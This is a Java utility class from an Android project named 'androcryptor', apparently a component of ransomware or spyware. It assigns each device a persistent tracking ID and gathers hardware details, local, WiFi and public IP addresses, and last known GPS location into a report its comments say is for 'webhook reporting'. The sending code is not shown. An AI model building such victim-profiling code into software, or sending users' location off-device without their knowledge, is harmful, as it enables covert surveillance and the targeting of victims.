/**
 * Utility class for device-specific operations and information gathering.
 * Handles device identification, network status, and location services.
 */

//#region Package and Imports
package com.example.androcryptor;

import android.Manifest;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.math.BigInteger;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.ByteOrder;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Collections;
import java.util.Enumeration;
import java.util.Random;
import java.util.UUID;
//#endregion

public class DeviceUtils {
    //#region Constants and Static Fields
    private static String deviceId = null;
    private static final String ID_PREFIX = "EX01";
    private static final String CHARACTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    private static final String PREFS_NAME = "ac_prefs"; // Shared preferences file name
    private static final String PREFS_DEVICE_ID_KEY = "device_id"; // Key for storing the device ID
    //#endregion

    //#region Device Identification Methods
    public static String getDeviceId(Context context) {
        if (deviceId == null) {
            SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            String storedId = prefs.getString(PREFS_DEVICE_ID_KEY, null);

            if (storedId != null) {
                deviceId = storedId;
            } else {
                // Generate a unique device ID with prefix "EX01" followed by 6 random characters
                StringBuilder randomId = new StringBuilder(ID_PREFIX);
                SecureRandom random = new SecureRandom();
                for (int i = 0; i < 6; i++) {
                    int index = random.nextInt(CHARACTERS.length());
                    randomId.append(CHARACTERS.charAt(index));
                }
                deviceId = randomId.toString();

                // Save the new ID to SharedPreferences
                SharedPreferences.Editor editor = prefs.edit();
                editor.putString(PREFS_DEVICE_ID_KEY, deviceId);
                editor.apply();
            }
        }
        return deviceId;
    }
    //#endregion

    //#region Device Information Methods
    /**
     * Get device information for webhook reporting including IP addresses
     */
    public static String getDeviceInfo(Context context) {
        StringBuilder info = new StringBuilder();
        info.append("**Device Info:**\\n");
        info.append("- Brand: ").append(Build.BRAND).append("\\n");
        info.append("- Model: ").append(Build.MODEL).append("\\n");
        info.append("- Android Version: ").append(Build.VERSION.RELEASE).append("\\n");
        info.append("- SDK Level: ").append(Build.VERSION.SDK_INT).append("\\n");
        info.append("- Device: ").append(Build.DEVICE).append("\\n");
        info.append("- Manufacturer: ").append(Build.MANUFACTURER).append("\\n");

        // Add IP addresses
        info.append("\\n**Network Info:**\\n");

        // Get local IP address
        String localIp = getLocalIpAddress();
        info.append("- Local IP: ").append(localIp != null ? localIp : "Unknown").append("\\n");

        // Get WiFi IP if available
        String wifiIp = getWifiIpAddress(context);
        if (wifiIp != null && !wifiIp.equals(localIp)) {
            info.append("- WiFi IP: ").append(wifiIp).append("\\n");
        }

        // Get public IP address (will be fetched asynchronously and added to webhook later)
        info.append("- Public IP: ").append("Fetching...").append("\\n");

        // Add location info if available
        Location location = getLastKnownLocation(context);
        if (location != null) {
            info.append("\\n**Location Info:**\\n");
            info.append("- Latitude: ").append(location.getLatitude()).append("\\n");
            info.append("- Longitude: ").append(location.getLongitude()).append("\\n");
            info.append("- Accuracy: ").append(location.getAccuracy()).append(" meters\\n");
        }

        return info.toString();
    }
    //#endregion

    //#region Network Methods
    /**
     * Get the local IP address
     */
    public static String getLocalIpAddress() {
        try {
            Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();
            while (networkInterfaces.hasMoreElements()) {
                NetworkInterface networkInterface = networkInterfaces.nextElement();
                // Skip loopback and inactive interfaces
                if (networkInterface.isLoopback() || !networkInterface.isUp()) {
                    continue;
                }

                Enumeration<InetAddress> addresses = networkInterface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress address = addresses.nextElement();
                    if (!address.isLoopbackAddress() && !address.isLinkLocalAddress()) {
                        return address.getHostAddress();
                    }
                }
            }
        } catch (Exception e) {
            Log.e("DeviceUtils", "Error getting local IP address", e);
        }
        return null;
    }

    /**
     * Get the WiFi IP address
     */
    public static String getWifiIpAddress(Context context) {
        try {
            WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wifiManager != null) {
                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                int ipAddress = wifiInfo.getIpAddress();

                // Convert little-endian to big-endian if needed
                if (ByteOrder.nativeOrder().equals(ByteOrder.LITTLE_ENDIAN)) {
                    ipAddress = Integer.reverseBytes(ipAddress);
                }

                byte[] ipByteArray = BigInteger.valueOf(ipAddress).toByteArray();

                String ipAddressString;
                if (ipByteArray.length > 4) {
                    ipAddressString = String.format("%d.%d.%d.%d",
                        (ipByteArray[ipByteArray.length - 4] & 0xff),
                        (ipByteArray[ipByteArray.length - 3] & 0xff),
                        (ipByteArray[ipByteArray.length - 2] & 0xff),
                        (ipByteArray[ipByteArray.length - 1] & 0xff));
                } else {
                    ipAddressString = String.format("%d.%d.%d.%d",
                        (ipByteArray.length > 0 ? ipByteArray[0] & 0xff : 0),
                        (ipByteArray.length > 1 ? ipByteArray[1] & 0xff : 0),
                        (ipByteArray.length > 2 ? ipByteArray[2] & 0xff : 0),
                        (ipByteArray.length > 3 ? ipByteArray[3] & 0xff : 0));
                }

                return ipAddressString;
            }
        } catch (Exception e) {
            Log.e("DeviceUtils", "Error getting WiFi IP address", e);
        }
        return null;
    }

    /**
     * Get the public IP address asynchronously
     * This should be called from a background thread
     */
    public static String getPublicIpAddress() {
        try {
            URL url = new URL("https://api.ipify.org");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);

            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;

            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();

            return response.toString();
        } catch (Exception e) {
            Log.e("DeviceUtils", "Error getting public IP address", e);
            return "Unknown";
        }
    }
    //#endregion

    //#region Location Services
    /**
     * Get the last known location
     */
    public static Location getLastKnownLocation(Context context) {
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                return null;
            }

            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            if (locationManager == null) {
                return null;
            }

            // Try GPS provider first
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (location != null) {
                    return location;
                }
            }

            // Try network provider next
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                Location location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (location != null) {
                    return location;
                }
            }

            // Try passive provider as last resort
            if (locationManager.isProviderEnabled(LocationManager.PASSIVE_PROVIDER)) {
                return locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
            }
        } catch (Exception e) {
            Log.e("DeviceUtils", "Error getting location", e);
        }

        return null;
    }
    //#endregion
}
